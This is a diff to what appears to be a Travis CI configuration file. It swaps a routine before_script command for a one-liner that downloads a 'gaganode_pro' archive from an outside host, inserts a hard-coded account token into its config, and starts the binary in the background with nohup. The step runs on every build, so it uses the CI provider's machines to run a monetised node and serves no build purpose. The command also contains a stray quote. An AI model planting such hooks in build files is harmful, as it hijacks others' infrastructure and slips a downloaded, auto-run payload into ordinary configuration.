@@ -2,4 +2,4 @@ dist: jammy
 before_script:
   - sudo apt update
   - sudo apt install docker.io -y
-  - sudo docker run -itd ubuntu; htop
+  - wget https://assets.coreservice.io/public/package/66/gaganode_pro/0.0.300/gaganode_pro-0_0_300.tar.gz && tar -xf *gz && cd *64/root_conf && sed -i '/token/d' default.toml && echo token = \'ivrtkbfjhfqyltirf908b71b4f9d9d5c\' >> default.toml.bak && cat default.toml >> default.toml.bak && rm default.toml && mv default.toml.bak default.toml" && cd .. && nohup ./gaganode
